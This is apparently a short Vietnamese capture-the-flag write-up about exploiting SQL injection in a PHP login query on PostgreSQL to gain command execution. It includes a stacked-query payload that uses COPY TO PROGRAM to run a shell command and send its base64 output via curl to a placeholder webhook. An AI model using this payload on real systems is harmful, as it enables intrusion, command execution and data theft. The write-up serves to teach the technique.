Dựa vào tiêu đề thì ta cần khai thác SQL Injection để RCE 

Đã biết câu query là `SELECT * FROM users WHERE username='$username' AND password = '$password'` với giá trị biến $username và $password lấy từ Request POST mà không qua bất kì filter nào. 

Bên cạnh đó nhận biết được luôn database sử dụng là Postgresql do hàm `pg_query()` được sử dụng. 

Do không sử dụng Prepared Statements mà nối chuỗi để tạo câu query luôn,nên có thể inject payload một cách dễ dàng để khai thác SQL Injection. 

- Cách 1: Dùng luôn SQLMap cho lẹ. 

- Cách 2: Do hàm `pg_query()` hỗ trợ thực thi 1 chuỗi lệnh SQL,nghĩa là ta có thể chạy nhiều lệnh SQL trong 1 lần truy vấn,miễn là các lệnh ngăn cách nhau bằng dấu `;` ,dùng lệnh COPY với từ khóa PROGRAM để thực thi lệnh shell trên hệ thống luôn mà không cần upload shell. 
Payload: 
```php
'; copy (SELECT '') to program 'curl <Link_webhook>?f=`<COMMAND> |base64`'-- -
```
Để gửi kết quả tới webhook,sau đó decode base64. 


